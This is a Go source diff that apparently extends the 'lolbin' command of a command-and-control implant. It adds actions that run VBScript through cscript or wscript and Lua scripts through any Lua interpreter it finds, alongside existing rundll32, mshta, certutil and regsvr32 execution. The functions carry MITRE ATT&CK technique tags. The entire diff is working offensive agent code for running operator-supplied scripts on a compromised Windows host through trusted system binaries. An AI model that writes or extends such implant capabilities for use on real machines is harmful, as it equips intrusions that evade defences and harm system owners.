@@ -75,8 +75,12 @@ func (c *LolbinCommand) Execute(task structs.Task) structs.CommandResult {
 		return lolbinRegsvr32(absPath, args.Args)
 	case "installutil":
 		return lolbinInstallUtil(absPath, args.Args)
+	case "vbs":
+		return lolbinVBS(absPath, args.Args)
+	case "lua":
+		return lolbinLua(absPath, args.Args)
 	default:
-		return errorf("Unknown action: %s (use rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil)", args.Action)
+		return errorf("Unknown action: %s (use rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil, vbs, lua)", args.Action)
 	}
 }
 
@@ -323,6 +327,76 @@ func lolbinInstallUtil(assemblyPath, extraArgs string) structs.CommandResult {
 	output, err := cmd.CombinedOutput()
 
 	result := fmt.Sprintf("[+] %s %s\n", installUtilPath, strings.Join(cmdArgs, " "))
+	if len(output) > 0 {
+		result += string(output)
+	}
+	if ctx.Err() == context.DeadlineExceeded {
+		result += "\n[!] Process killed after timeout"
+	} else if err != nil {
+		result += fmt.Sprintf("\nProcess exited: %v", err)
+	}
+
+	return successResult(result)
+}
+
+// vbs — T1059.005 — Execute VBScript via cscript.exe or wscript.exe
+func lolbinVBS(scriptPath, extraArgs string) structs.CommandResult {
+	// Try cscript first (console output), fall back to wscript (GUI)
+	interpreter := "cscript.exe"
+	if _, err := exec.LookPath(interpreter); err != nil {
+		interpreter = "wscript.exe"
+	}
+
+	cmdArgs := []string{"//Nologo", scriptPath}
+	if extraArgs != "" {
+		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
+	defer cancel()
+
+	cmd := exec.CommandContext(ctx, interpreter, cmdArgs...)
+	output, err := cmd.CombinedOutput()
+
+	result := fmt.Sprintf("[+] VBScript execution via %s\n    Script: %s\n", interpreter, scriptPath)
+	if len(output) > 0 {
+		result += string(output)
+	}
+	if ctx.Err() == context.DeadlineExceeded {
+		result += "\n[!] Process killed after timeout"
+	} else if err != nil {
+		result += fmt.Sprintf("\nProcess exited: %v", err)
+	}
+
+	return successResult(result)
+}
+
+// lua — T1059 — Execute Lua script via lua interpreter
+func lolbinLua(scriptPath, extraArgs string) structs.CommandResult {
+	// Search for Lua interpreters
+	var interpreter string
+	for _, name := range []string{"lua", "lua5.4", "lua5.3", "lua5.1", "luajit"} {
+		if p, err := exec.LookPath(name); err == nil {
+			interpreter = p
+			break
+		}
+	}
+	if interpreter == "" {
+		return errorResult("Error: no Lua interpreter found (lua, lua5.4, lua5.3, lua5.1, luajit)")
+	}
+
+	cmdArgs := []string{scriptPath}
+	if extraArgs != "" {
+		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
+	defer cancel()
+
+	cmd := exec.CommandContext(ctx, interpreter, cmdArgs...)
+	output, err := cmd.CombinedOutput()
+
+	result := fmt.Sprintf("[+] Lua execution via %s\n    Script: %s\n", interpreter, scriptPath)
 	if len(output) > 0 {
 		result += string(output)
 	}
